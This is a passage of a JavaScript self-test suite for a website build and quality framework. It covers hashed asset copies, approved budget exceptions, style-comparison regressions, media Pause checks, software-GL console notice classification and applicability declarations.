  for (const [f, h] of delivered) { let got = null; try { got = sha256(readFileSync(join(root, f))); } catch { /* absent */ } if (got !== h) p.push(id + ': the delivered file ' + f + ' is not carried unaltered'); }
  rmSync(out, { recursive: true, force: true });
}
rmSync(site, { recursive: true, force: true });
out(p);`), null],
  // ---- framework compatibility corrections (owner approval, 2026-10-18): the hashed copy of a project with several stylesheets, per-page and per-image budget exceptions that must be approved, and
  // the style comparison that ignores the test server's own address and nothing else. Each group shows the protections that were there before still catching what they caught.
  ['hashed copy: a project with ONE stylesheet (the fixture) is built exactly as before: one sheet, every file renamed by its content, every reference resolving, two builds identical', () => inProject(FIXTURE, COMPAT_PRE + `
const h = tempDir('g-h1'), h2 = tempDir('g-h2'); tmp.push(h, h2);
const built = buildHashed(site, h); buildHashed(site, h2);
if (stylesheetsOf().length !== 1 || stylesheetsOf()[0] !== 'styles.css') p.push('the fixture should have exactly the one stylesheet styles.css, got ' + stylesheetsOf().join(','));
if (treeHash(h) !== treeHash(h2)) p.push('two hashed builds differ');
for (const [o, n] of Object.entries(built.map)) { if (!fs.existsSync(path.join(h, n))) p.push(o + ' was not written as ' + n); if (!/[.][0-9a-f]{8}[.]/.test(n)) p.push(n + ' does not carry a content hash'); }
p.push(...refsResolve(h));
const r = await checkAssets({ root: site, browser: false }); p.push(...r.problems);
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['hashed copy: a project with TWO stylesheets keeps both: each is rewritten and renamed by its content, its url() references follow the renamed media, nothing is left pointing at an old name, two builds are identical', () => multiCopy(`
const h = tempDir('g-h1'), h2 = tempDir('g-h2'); tmp.push(h, h2);
const built = buildHashed(site, h); buildHashed(site, h2);
if (treeHash(h) !== treeHash(h2)) p.push('two hashed builds differ');
for (const sheet of ['styles.css', 'extra.css']) { const n = built.map[sheet]; if (!n || !fs.existsSync(path.join(h, n))) p.push(sheet + ' was lost in the hashed copy'); else if (!/[.][0-9a-f]{8}[.]css$/.test(n)) p.push(sheet + ' was not renamed by its content: ' + n); }
const extra = built.map['extra.css'] ? fs.readFileSync(path.join(h, built.map['extra.css']), 'utf8') : '';
if (extra.includes('media/press-hero.webp') || !extra.includes(built.map['media/press-hero.webp'])) p.push('extra.css still names the plain media file instead of the hashed one: ' + extra.slice(0, 120));
if (!fs.readFileSync(path.join(h, 'index.html'), 'utf8').includes(built.map['extra.css'])) p.push('index.html does not link the hashed extra.css');
p.push(...refsResolve(h));
const r = await checkAssets({ root: site, browser: false }); p.push(...r.problems);
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['hashed copy: a page that links a stylesheet which is not a delivered shared file is reported (the hashed copy would lose it)', () => multiCopy(`
fs.writeFileSync(path.join(site, 'orphan.css'), 'body{margin:0}');
const idx2 = path.join(site, 'index.html'); fs.writeFileSync(idx2, fs.readFileSync(idx2, 'utf8').replace('href="extra.css">', 'href="extra.css"><link rel="stylesheet" href="orphan.css">'));
const r = await checkAssets({ root: site, browser: false }); out(r.problems); tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true }));`), /orphan\.css, which is not a delivered shared file/],
  ['hashed copy: a second stylesheet altered after the manifest was recorded, an unexpected media file, and a missing second stylesheet are each still reported', () => multiCopy(`
const bad = [];
const alter = path.join(site, 'extra.css'); fs.appendFileSync(alter, '.x{color:red}');
bad.push(...(await checkAssets({ root: site, browser: false })).problems.map((x) => 'altered: ' + x));
fs.writeFileSync(alter, '.extra-bg{background-image:url(media/press-hero.webp)}\\n');
fs.writeFileSync(path.join(site, 'media', 'unexpected.webp'), fs.readFileSync(path.join(site, 'media', 'press-hero.webp')));
bad.push(...(await checkAssets({ root: site, browser: false })).problems.map((x) => 'unexpected: ' + x));
fs.rmSync(path.join(site, 'media', 'unexpected.webp')); fs.rmSync(alter);
try { bad.push(...(await checkAssets({ root: site, browser: false })).problems.map((x) => 'missing: ' + x)); } catch (e) { bad.push('missing: the check stopped on the missing file: ' + e.code); }
const need = ['altered: ', 'unexpected: ', 'missing: ']; const miss = need.filter((k) => !bad.some((x) => x.startsWith(k)));
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(miss.map((k) => 'nothing was reported for the ' + k.replace(': ', '') + ' case'));`), null],
  ['budgets: a project with no exceptions is held to the shared limits exactly as before (the fixture passes; the shared limits still catch an oversized page and image)', () => inProject(FIXTURE, BUDGET_PRE + `
const none = await checkBudgets({ root: site, browser: false, budgets: base, approvalIds: ids }); p.push(...none.problems);
const tight = JSON.parse(JSON.stringify(base)); tight.limits.page.htmlGzip = 10; tight.limits.maxImageBytes = 1000;
const r = await checkBudgets({ root: site, browser: false, budgets: tight, approvalIds: ids });
for (const f of ['index.html', 'services.html', 'contact.html']) if (!r.problems.some((x) => x.startsWith(f + ' HTML'))) p.push(f + ' was not held to the shared HTML limit');
if (!r.problems.some((x) => x.startsWith('largest image'))) p.push('the shared image limit did not apply');
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['budgets: an approved page exception changes only the page and the limit it names; the other pages keep the shared limit; a page above its own exception still fails', () => inProject(FIXTURE, BUDGET_PRE + `
const tight = JSON.parse(JSON.stringify(base)); tight.limits.page.htmlGzip = 10;
tight.exceptions = { pages: { 'index.html': { approval: 'APR-QF-001', reason: 'a test exception', limits: { htmlGzip: 100000 } } } };
let r = await checkBudgets({ root: site, browser: false, budgets: tight, approvalIds: ids });
if (r.problems.some((x) => x.startsWith('index.html HTML'))) p.push('the approved exception did not apply to its own page');
for (const f of ['services.html', 'contact.html']) if (!r.problems.some((x) => x.startsWith(f + ' HTML'))) p.push('the exception was extended to ' + f);
if (!r.notes.some((x) => x.startsWith('approved exceptions in force: index.html (APR-QF-001)'))) p.push('the exception in force is not listed in the notes');
tight.exceptions.pages['index.html'].limits.htmlGzip = 5;
r = await checkBudgets({ root: site, browser: false, budgets: tight, approvalIds: ids });
if (!r.problems.some((x) => x.startsWith('index.html HTML (gzip): ') && x.endsWith('exceeds the budget of 5'))) p.push('a page above its own exception was not reported');
const other = JSON.parse(JSON.stringify(base)); other.limits.page.jsGzip = 1; other.exceptions = { pages: { 'index.html': { approval: 'APR-QF-001', reason: 'only the HTML limit', limits: { htmlGzip: 100000 } } } };
r = await checkBudgets({ root: site, browser: false, budgets: other, approvalIds: ids });
if (!r.problems.some((x) => x.startsWith('index.html scripts (gzip)'))) p.push('an exception for one limit loosened another limit of the same page');
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['budgets: an approved image exception covers only the file it names and only up to its own limit; every other image keeps the shared limit', () => inProject(FIXTURE, BUDGET_PRE + `
const big = Buffer.alloc(90000, 7);
fs.appendFileSync(path.join(site, 'media', 'press-hero.webp'), big); fs.appendFileSync(path.join(site, 'media', 'type-drawer.webp'), big);
const lim = JSON.parse(JSON.stringify(base)); lim.limits.maxImageBytes = 80000; lim.limits.deliveredBytes = 100000000;
let r = await checkBudgets({ root: site, browser: false, budgets: lim, approvalIds: ids });
if (!r.problems.some((x) => x.startsWith('largest image'))) p.push('without an exception the oversized images were not reported');
lim.exceptions = { images: { 'media/press-hero.webp': { approval: 'APR-QF-001', reason: 'a test exception', bytes: 120000 } } };
r = await checkBudgets({ root: site, browser: false, budgets: lim, approvalIds: ids });
if (!r.problems.some((x) => x.startsWith('largest image'))) p.push('the exception for press-hero.webp was extended to the other image');
if (r.problems.some((x) => x.includes('press-hero.webp'))) p.push('the excepted image was reported although it is within its own limit');
lim.exceptions.images['media/press-hero.webp'].bytes = 50000;
r = await checkBudgets({ root: site, browser: false, budgets: lim, approvalIds: ids });
if (!r.problems.some((x) => x.startsWith('image media/press-hero.webp (approved exception APR-QF-001): ') && x.endsWith('exceeds the budget of 50000'))) p.push('an image above its own exception was not reported');
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['budgets: a missing, malformed or unauthorised exception is rejected: no approval, an approval that is not in the log, no reason, an unknown page, an unknown or non-numeric or non-positive limit, an unknown field, a missing image, no bytes', () => inProject(FIXTURE, `
const { validateBudgetExceptions } = await L('checks/budgets.mjs');
const ctx = { pages: ['index.html', 'services.html'], files: ['media/a.webp'], approvalIds: ['APR-QF-001'] };
const ok = (limits) => ({ pages: { 'index.html': { approval: 'APR-QF-001', reason: 'why', limits } } });
const p = [];
const must = (what, ex, re) => { const e = validateBudgetExceptions(ex, ctx); if (!e.length) p.push(what + ': accepted'); else if (!re.test(e.join(' | '))) p.push(what + ': reported ' + e[0].slice(0, 100)); };
if (validateBudgetExceptions(undefined, ctx).length) p.push('no exceptions must be accepted');
if (validateBudgetExceptions(ok({ htmlGzip: 4400, requests: 14, blockingMs: 9000 }), ctx).length) p.push('a complete, authorised exception was refused');
if (validateBudgetExceptions({ images: { 'media/a.webp': { approval: 'APR-QF-001', reason: 'why', bytes: 142000 } } }, ctx).length) p.push('a complete, authorised image exception was refused');
must('exceptions is not an object', [], /must be an object/); must('exceptions is a string', 'x', /must be an object/);
must('no approval', { pages: { 'index.html': { reason: 'why', limits: { htmlGzip: 1 } } } }, /approval.*required/);
must('an approval that is not in the log', { pages: { 'index.html': { approval: 'APR-QF-999', reason: 'why', limits: { htmlGzip: 1 } } } }, /not in the approvals log/);
must('no reason', { pages: { 'index.html': { approval: 'APR-QF-001', limits: { htmlGzip: 1 } } } }, /reason.*required/);
must('a page that is not delivered', { pages: { 'other.html': { approval: 'APR-QF-001', reason: 'why', limits: { htmlGzip: 1 } } } }, /not a delivered page/);
must('a limit that may not have an exception', ok({ cssGzip: 1 }), /not a limit that may have an exception/);
must('a limit that is not a number', ok({ htmlGzip: '4400' }), /positive whole number/);
must('a limit that is zero', ok({ htmlGzip: 0 }), /positive whole number/);
must('a negative limit', ok({ htmlGzip: -5 }), /positive whole number/);
must('a fractional limit', ok({ htmlGzip: 1.5 }), /positive whole number/);
must('no limits', ok({}), /at least one limit/);
must('an unknown field on a page entry', { pages: { 'index.html': { approval: 'APR-QF-001', reason: 'why', limits: { htmlGzip: 1 }, extra: 1 } } }, /unknown field/);
must('an unknown group', { page: {} }, /unknown field/);
must('an image that is not delivered', { images: { 'media/missing.webp': { approval: 'APR-QF-001', reason: 'why', bytes: 1 } } }, /not a delivered image/);
must('an image without bytes', { images: { 'media/a.webp': { approval: 'APR-QF-001', reason: 'why' } } }, /bytes.*positive whole number/);
out(p);`), null],
  ['budgets: while the exceptions are invalid NONE applies: the shared limits decide and the invalid entry is reported (a bad entry can only make the check stricter)', () => inProject(FIXTURE, BUDGET_PRE + `
const lim = JSON.parse(JSON.stringify(base)); lim.limits.page.htmlGzip = 10;
lim.exceptions = { pages: { 'index.html': { approval: 'APR-QF-999', reason: 'not in the log', limits: { htmlGzip: 100000 } } } };
const r = await checkBudgets({ root: site, browser: false, budgets: lim, approvalIds: ids });
if (!r.problems.some((x) => /not in the approvals log/.test(x))) p.push('the unauthorised exception was not reported');
if (!r.problems.some((x) => x.startsWith('index.html HTML'))) p.push('an unauthorised exception was applied');
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['regression: the test server\'s own address inside a computed url() no longer makes a style difference, a changed path, another origin, a different file, a changed custom property and a changed colour still do', () => styleCase(`
const none = await styles(A, A2);
if (none.length) p.push('the same site on two servers differs only by address and was reported: ' + none[0].slice(0, 160));
const path2 = await styles(A, variant((t) => t.replace('background-image:url(media/press-hero.webp)', 'background-image:url(media/type-drawer.webp)')));
if (!path2.length) p.push('a computed background-image that names another file was not reported');
const other = await styles(A, variant((t) => t.replace('background-image:url(media/press-hero.webp)', 'background-image:url(http://example.com/media/press-hero.webp)')));
if (!other.length) p.push('a computed background-image on another origin was not reported');
const prop = await styles(A, variant((t) => t.replace('--plate:url(media/press-hero.webp)', '--plate:url(media/type-drawer.webp)')));
if (!prop.length) p.push('a custom property naming another file was not reported');
const colour = await styles(A, variant((t) => t + 'body{color:#123456}'));
if (!colour.length) p.push('a changed colour was not reported');
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['regression: the content hash in a hashed copy\'s file names is ignored only when check:assets asks for it, and only in the final name of a computed url(); a changed file is still reported', () => styleCase(`
const H = tempDir('g-hashed'); tmp.push(H); buildHashed(A, H);
const strict = await styles(A, H);
if (!strict.length) p.push('without the option the hashed names should differ (the comparison must stay strict by default)');
const lenient = await styles(A, H, true);
if (lenient.length) p.push('with the option the hashed copy still differs only by its hashed names: ' + lenient[0].slice(0, 160));
const swapped = tempDir('g-hashed2'); tmp.push(swapped); buildHashed(variant((t) => t.replace('background-image:url(media/press-hero.webp)', 'background-image:url(media/type-drawer.webp)')), swapped);
const changed = await styles(A, swapped, true);
if (!changed.length) p.push('a hashed copy that names another file was not reported even with the option');
tmp.forEach((x) => fs.rmSync(x, { recursive: true, force: true })); out(p);`), null],
  ['media Pause: motion that is still finishing a 1.4 s transition after the click is given the time to finish (the old fixed 500 ms wait reported it), and a correct Pause passes with the control reporting pressed', () => pauseCase({}, (found, all) => (found.length ? ['a correct Pause was reported: ' + found.map((x) => x.key + ' ' + x.detail).join(' | ')] : [])), null],
  ['media Pause: motion that is NOT stopped by Pause is reported after the finite wait (persistent motion stays a failure)', () => pauseCase({ script: "var b=document.querySelector('.pause');b.addEventListener('click',function(){b.setAttribute('aria-pressed','true')});" }, (found) => found.some((x) => /pause-ineffective/.test(x.key) && /animation\(s\) running/.test(x.detail) && /\d{4} ms after the click/.test(x.detail)) ? [] : ['persistent motion after Pause was not reported: ' + JSON.stringify(found)]), null],
  ['media Pause: a Pause control that stops the motion but does not report its state (aria-pressed stays "false") is reported', () => pauseCase({ script: "var b=document.querySelector('.pause');b.addEventListener('click',function(){document.documentElement.classList.toggle('still')});" }, (found) => found.some((x) => /pause-state/.test(x.key) && /aria-pressed="false"/.test(x.detail)) && !found.some((x) => /pause-ineffective/.test(x.key)) ? [] : ['an unreported Pause state was not reported as pause-state alone: ' + JSON.stringify(found)]), null],
  ['media Pause: a Pause control with no aria-pressed at all is judged on the motion alone (not-pressed state is not invented)', () => pauseCase({ button: '<button class="pause" type="button"><span>Pause motion</span></button>', script: "var b=document.querySelector('.pause');b.addEventListener('click',function(){document.documentElement.classList.toggle('still')});" }, (found) => (found.length ? ['a stateless but working Pause was reported: ' + JSON.stringify(found)] : [])), null],
  ['software-GL notice: the classifier knows the one exact Chromium notice and nothing else (other engines, types, texts, locations, missing or hardware evidence, and more than four all stay failures)', () => inProject(FIXTURE, GL_CHILD + `
T('the exact notice with browser-level evidence', {}, true);
T('the notice with the single suffix Chromium appends', { text: ok.text + ' (this message will no longer repeat)' }, true);
T('Firefox', { engine: 'firefox' }, false); T('WebKit', { engine: 'webkit' }, false);
T('an error instead of a warning', { type: 'error' }, false); T('a log message', { type: 'log' }, false);
for (const [what, text] of [['another severity', ok.text.replace('High', 'Medium')], ['another operation', ok.text.replace('ReadPixels', 'DrawArrays')], ['another message type', ok.text.replace('Performance', 'Error')], ['another category', ok.text.replace('GL_CLOSE_PATH_NV', 'GL_INVALID_OPERATION')],
  ['text before it', 'x ' + ok.text], ['text after it', ok.text + ' and more'], ['a different suffix', ok.text + ' (this message will repeat)'], ['no context id', ok.text.replace(/^[^ ]*GL Driver/, 'GL Driver')], ['a new line', ok.text + String.fromCharCode(10) + 'x'], ['an empty text', ''], ['a GL error', '[.WebGL-0x1]GL_INVALID_OPERATION: glDrawArrays: no valid program']]) T(what, { text }, false);
T('no evidence', { evidence: null }, false); T('evidence that is not software', { evidence: { software: false, renderer: 'NVIDIA' } }, false); T('evidence that is only truthy', { evidence: { software: 'yes' } }, false);
T('the fifth notice on a page', { seen: SWGL_LIMIT }, false); T('the fourth notice on a page', { seen: SWGL_LIMIT - 1 }, true);
T('no location', { location: null }, false); T('a position inside a script (column 228)', { location: { url: DOC, lineNumber: 0, columnNumber: 228 } }, false); T('the line of the document script that was running (column 0)', { location: { url: DOC, lineNumber: 42, columnNumber: 0 } }, true);
T('a script file as the source', { location: { url: 'http://127.0.0.1:9/gl.js', lineNumber: 0, columnNumber: 0 } }, false); T('no documents', { documents: null }, false);
out(p);`), null],
  ['software-GL notice: the rendering evidence names a software rasteriser only (SwiftShader, llvmpipe); a GPU, no WebGL, no debug extension, an odd value or an error give none', () => inProject(FIXTURE, `
const { renderingEvidence } = await L('lib/engine-noise.mjs');
const fake = (v, boom) => ({ newContext: async () => { if (boom) throw new Error('no context'); return { newPage: async () => ({ evaluate: async () => v }), close: async () => {} }; } });
const p = [];
for (const [what, v, boom, want] of [['SwiftShader', 'ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero) (0x0000C0DE)), SwiftShader driver)', false, true], ['llvmpipe', 'llvmpipe (LLVM 15.0.7, 256 bits)', false, true], ['an NVIDIA GPU', 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)', false, false], ['an Apple GPU', 'Apple M2', false, false], ['no WebGL', null, false, false], ['an undefined result', undefined, false, false], ['a number', 7, false, false], ['a browser that cannot make a context', null, true, false]]) {
  const e = await renderingEvidence(fake(v, boom)); if (e.software !== want) p.push(what + ': software ' + e.software + ', expected ' + want);
}
const b = fake('Apple M2'); await renderingEvidence(b); const again = await renderingEvidence(b); if (again.renderer !== 'Apple M2') p.push('the evidence is not kept for the browser');
out(p);`), null],
  ['software-GL notice: on a page with a WebGL canvas the security check counts the browser\'s notice (E-SWGL-01, with the renderer) and reports no console message', async () => { const r = glParse(glSite('')); const p = []; if (r.console.length) p.push('the known notice was still reported: ' + r.console[0].slice(0, 200)); if (!r.notes.some((x) => /4 known chromium software-GL notice\(s\) \(E-SWGL-01: WebGL renders on .*SwiftShader/.test(x))) p.push('the notice was not counted and reported: ' + JSON.stringify(r.notes)); return p; }, null],
  ['software-GL notice: beside it, a page\'s own console.warn of the same text, an unrelated warning, an error and a WebGL error are each still reported', async () => { const p = []; const same = glParse(glSite('console.warn(' + JSON.stringify(GL_NOTICE) + ');')); if (!same.console.some((x) => /GL Driver Message/.test(x))) p.push('a console.warn written by the page in the notice\'s words was classified as the browser\'s notice');
    const other = glParse(glSite('console.warn("an unrelated warning");')); if (!other.console.some((x) => /an unrelated warning/.test(x))) p.push('an unrelated warning was hidden');
    const err = glParse(glSite('console.error("a real error");')); if (!err.console.some((x) => /a real error/.test(x))) p.push('an error was hidden');
    const glerr = glParse(glSite('gl.useProgram(null);gl.drawArrays(gl.TRIANGLES,0,3);')); if (!glerr.console.some((x) => /INVALID_OPERATION|no valid shader program/i.test(x))) p.push('a WebGL error was hidden: ' + JSON.stringify(glerr.console).slice(0, 300));
    return p; }, null],
  ['software-GL notice: the portability walks count the same browser notice and report no console message for it, and still report a page\'s own warning', () => inProject(FIXTURE, `
const fs = await import('node:fs'); const path = await import('node:path');
const { assembleCandidate } = await L('lib/site.mjs'); const { projectDir } = await L('lib/git.mjs'); const { checkPortability } = await L('checks/portability.mjs');
const p = [];
const run = async (extra) => { const site = assembleCandidate(projectDir, 'g-glp');
  fs.writeFileSync(path.join(site, 'gl.js'), 'var c=document.createElement("canvas");c.width=64;c.height=64;document.body.appendChild(c);var gl=c.getContext("webgl2");var n=0;(function f(){gl.clearColor((n++%60)/60,0.2,0.3,1);gl.clear(gl.COLOR_BUFFER_BIT);if(n<120)requestAnimationFrame(f)})();' + extra);
  const f = path.join(site, 'index.html'); fs.writeFileSync(f, fs.readFileSync(f, 'utf8').replace('</body>', '<script src="gl.js"></script></body>'));
  const r = await checkPortability({ root: site, adapters: false }); fs.rmSync(site, { recursive: true, force: true }); return r; };
const clean = await run('');
if (clean.problems.some((x) => /GL Driver|GPU stall/.test(x))) p.push('the known notice was reported by the portability walk: ' + clean.problems.find((x) => /GL Driver|GPU stall/.test(x)).slice(0, 200));
if (!clean.notes.some((x) => /known chromium software-GL notice\\(s\\) \\(E-SWGL-01/.test(x))) p.push('the portability walk did not count the notice');
const warned = await run('console.warn("a warning of the page\\'s own");');
if (!warned.problems.some((x) => /a warning of the page/.test(x))) p.push('the portability walk hid a warning of the page\\'s own');
out(p);`), null],
  ['applicability: a declaration that meets every condition is honoured: the inert case is listed as justified not applicable (not as a pass), its project-owned equivalent ran and caught, and nothing fails', () => { const r = naRun({ entries: [NA_OK_ENTRY()] }); const p = []; if (r.problems.length) p.push('problems: ' + r.problems.join(' | ').slice(0, 300)); if (!r.notes.some((x) => x.startsWith('not applicable, justified (APR-QF-001): ' + NA_CASE) && /ran in this run and caught its defect/.test(x))) p.push('the justified N/A is not listed with its equivalent: ' + JSTR(r.notes).slice(0, 300)); if (r.notes.some((x) => x === 'caught: ' + NA_CASE)) p.push('the N/A case was also counted as caught'); if (!r.notes.some((x) => /^0 targeted negative tests run .*; 1 justified not applicable/.test(x))) p.push('the counts do not separate applicable runs from N/A: ' + JSTR(r.notes).slice(-300)); return p; }, null],
  ['applicability: without a declaration the same inert case FAILS (nothing is not applicable by itself)', () => { const r = naRun({}); return r.problems.some((x) => x.startsWith(NA_CASE + ': the check reported nothing; the defect went undetected')) ? [] : ['an inert case with no declaration did not fail: ' + JSTR(r).slice(0, 300)]; }, null],
  ['applicability: a declaration for a case whose selectors DO exist is refused and the case runs and passes on its own (a real failure cannot be reclassified)', () => { const r = naRun({ rename: false, entries: [NA_OK_ENTRY()] }); const p = []; if (!r.problems.some((x) => /selftest-applicability\.json \(.*\): .*exist.* on index\.html, so the case's edit is not inert/.test(x))) p.push('the declaration was not refused: ' + JSTR(r.problems).slice(0, 300)); if (!r.notes.includes('caught: ' + NA_CASE)) p.push('the case did not run: ' + JSTR(r.notes).slice(0, 300)); if (r.notes.some((x) => x.startsWith('not applicable, justified'))) p.push('it was listed as N/A'); return p; }, null],
  ['applicability: a declaration whose project-owned equivalent reports a problem, catches nothing, throws, or is missing is refused, the reason is reported and the case still fails as undetected', () => { const p = []; for (const [what, equivalent, re] of [['reports a problem', "export const own = async () => ({ problems: ['it broke'], notes: [] });", /reported a problem: it broke/], ['catches nothing', "export const own = async () => ({ problems: [], notes: ['0 targeted negative tests run'] });", /did not run and catch its defect/], ['throws', "export const own = async () => { throw new Error('boom'); };", /could not be run: boom/], ['has no such export', "export const other = 1;", /no function "own" is exported/], ['returns the wrong shape', "export const own = async () => 7;", /did not return/]]) {
    const r = naRun({ entries: [NA_OK_ENTRY()], equivalent }); if (!r.problems.some((x) => re.test(x))) p.push(what + ': ' + JSTR(r.problems).slice(0, 240)); if (!r.problems.some((x) => x.startsWith(NA_CASE + ': the check reported nothing'))) p.push(what + ': the case was not run after the refusal'); if (r.notes.some((x) => x.startsWith('not applicable, justified'))) p.push(what + ': it was honoured'); } return p; }, null],
  ['applicability: every malformed declaration is rejected (unknown case, missing or short reason, reason that names none of the selectors, no approval, an approval that is not in the log, no equivalent, a module outside the project or in the framework, a different equivalent case name, unknown fields, a duplicate), and the generic fixture may declare nothing', () => inProject(FIXTURE, `
const { applicabilityErrors } = await L('checks/selftest-gate2.mjs');
const C = ${JSTR(NA_CASE)}; const eligible = new Map([[C, { selectors: ['.hero-text', '.hero h1', '.hero .eyebrow'] }]]);
const root = ${JSTR(FIXTURE)};
const good = ${JSTR(NA_OK_ENTRY())}; good.equivalent.module = 'engineering/tokens.json'.replace('tokens.json', 'checks/x.mjs');
const ctx = { eligible, approvalIds: ['APR-QF-001'], projectRoot: root };
const p = [];
const errs = (rec, extra = {}) => applicabilityErrors(rec, { ...ctx, ...extra }).errors;
const want = (what, rec, re, extra) => { const e = errs(rec, extra); if (!e.length) p.push(what + ': accepted'); else if (!re.test(e.join(' | '))) p.push(what + ': ' + e[0].slice(0, 120)); };
const mod = (f) => { const e = JSON.parse(JSON.stringify(good)); f(e); return { entries: [e] }; };
want('not an object', [], /must be an object/); want('no entries list', {}, /must be an object/); want('an unknown top-level field', { entries: [], extra: 1 }, /unknown field/);
want('an entry that is not an object', { entries: ['x'] }, /must be an object/);
want('an unknown case', mod((e) => { e.case = 'forced-colors: hero text left on the photograph '; }), /must name, exactly/);
want('no reason', mod((e) => { delete e.reason; }), /"reason" is required/); want('a short reason', mod((e) => { e.reason = '.hero-text is absent'; }), /at least 40 characters/);
want('a reason that names no selector', mod((e) => { e.reason = 'The markup of this project differs from the fixture in several ways that matter here.'; }), /must name at least one of the selectors/);
want('no approval', mod((e) => { delete e.approval; }), /"approval" is required/); want('an approval not in the log', mod((e) => { e.approval = 'APR-QF-999'; }), /not in the approvals log/);
want('no equivalent', mod((e) => { delete e.equivalent; }), /"equivalent" is required/);
want('an absolute module', mod((e) => { e.equivalent.module = '/etc/own.mjs'; }), /relative \.mjs path/); want('a module with ..', mod((e) => { e.equivalent.module = '../x.mjs'; }), /relative \.mjs path/);
want('a module outside engineering', mod((e) => { e.equivalent.module = 'src/render.mjs'; }), /project's own engineering folder/);
want('a module of the framework', mod((e) => { e.equivalent.module = 'engineering/checks/selftest-gate2.mjs'; }), /(framework|does not exist)/);
want('a module that does not exist', mod((e) => { e.equivalent.module = 'engineering/checks/nowhere.mjs'; }), /does not exist/);
want('a different equivalent case', mod((e) => { e.equivalent.case = 'keyboard: a positive tabindex'; }), /same name/); want('no export', mod((e) => { delete e.equivalent.export; }), /export is required/);
want('an unknown field on the entry', mod((e) => { e.note = 'x'; }), /unknown field/); want('an unknown field on the equivalent', mod((e) => { e.equivalent.x = 1; }), /unknown field/);
{ const d = JSON.parse(JSON.stringify(good)); want('a duplicate', { entries: [d, JSON.parse(JSON.stringify(d))] }, /declared twice|exist/); }
want('the generic fixture itself', { entries: [] }, /reference/, { reference: true });
out(p);`), null],
  ['applicability: on the generic fixture the three cases the owner named run as before and are caught (hero text, the menu button, the blocked main thread), with no N/A', () => { const p = []; for (const [name, caughtRe] of [[NA_CASE, /^caught: forced-colors: hero text left on the photograph$/], ['forced-colors: the menu button draws nothing', /^caught: forced-colors: the menu button draws nothing$/], ['budgets: the main thread blocked at load', /^caught: budgets: the main thread blocked at load$/]]) {
    const r = inProject(FIXTURE, `const { checkSelftestGate2 } = await L('checks/selftest-gate2.mjs'); const r = await checkSelftestGate2({ only: ${JSTR(name)} }); out([JSON.stringify(r)]);`); let j; try { j = JSON.parse(r[0]); } catch { p.push(name + ': ' + String(r[0]).slice(0, 200)); continue; }
    if (j.problems.length) p.push(name + ': ' + j.problems[0].slice(0, 200)); if (!j.notes.some((x) => caughtRe.test(x))) p.push(name + ': not caught: ' + JSTR(j.notes).slice(0, 200)); if (j.notes.some((x) => /not applicable/.test(x))) p.push(name + ': listed as N/A'); } return p; }, null],
  ['budgets (blocked main thread): where an approved exception raises a page\'s blocking limit, the case runs on a page that keeps the shared limit and still catches the stall; if no page keeps it, the case fails instead of passing quietly', () => { const p = []; const BL = 'budgets: the main thread blocked at load';
    const ex = (pages) => (b) => { b.exceptions = { pages: Object.fromEntries(pages.map((f) => [f, { approval: 'APR-QF-001', reason: 'a test exception for the blocking-time limit of this page', limits: { blockingMs: 9000 } }])) }; };
    const one = naRun({ rename: false, only: BL, equivalent: null, budgets: ex(['index.html']) }); if (one.problems.length || !one.notes.includes('caught: ' + BL)) p.push('with Home excepted the stall was not caught on another page: ' + JSTR(one).slice(0, 300));
    const all = naRun({ rename: false, only: BL, equivalent: null, budgets: ex(['index.html', 'services.html', 'contact.html']) }); if (!all.problems.some((x) => x.startsWith(BL + ': '))) p.push('with every page excepted the case did not fail: ' + JSTR(all).slice(0, 300)); return p; }, null],
];

export const CASES = cases.length;

export async function checkSelftestGeneric() {
  const problems = [], notes = [];
  const t0 = Date.now();
  for (const [name, run, expect] of cases) {
    let r;
    try { r = await run(); } catch (e) { r = [`check crashed: ${e.message}`]; }
    if (r === null) { notes.push(`not applicable here (needs the framework repository's .github folder beside the engineering): ${name.slice(0, 90)}`); continue; }
    if (expect === null) { if (r.length) problems.push(`${name}: ${r[0].slice(0, 220)}`); else notes.push(`held: ${name}`); }
    else if (!r.length) problems.push(`${name}: nothing was reported; the defect went undetected`);
    else if (!expect.test(r.join('\n'))) problems.push(`${name}: reported something else (${r[0].slice(0, 160)}), expected ${expect}`);
    else notes.push(`caught: ${name}`);
  }
  notes.push(`${cases.length} generic-fixture tests run in ${((Date.now() - t0) / 1000).toFixed(0)} s (project: ${fx.name}, running as ${project.name})`);
  return { problems, notes };
}

if (isMain(import.meta.url)) {
  const { problems, notes } = await checkSelftestGeneric();
  notes.forEach((x) => console.log('  ' + x));
  problems.forEach((p) => console.log('  - ' + p));
  console.log(`${problems.length ? 'FAIL' : 'PASS'}  check:selftest-generic`);
  process.exit(problems.length ? 1 : 0);
}
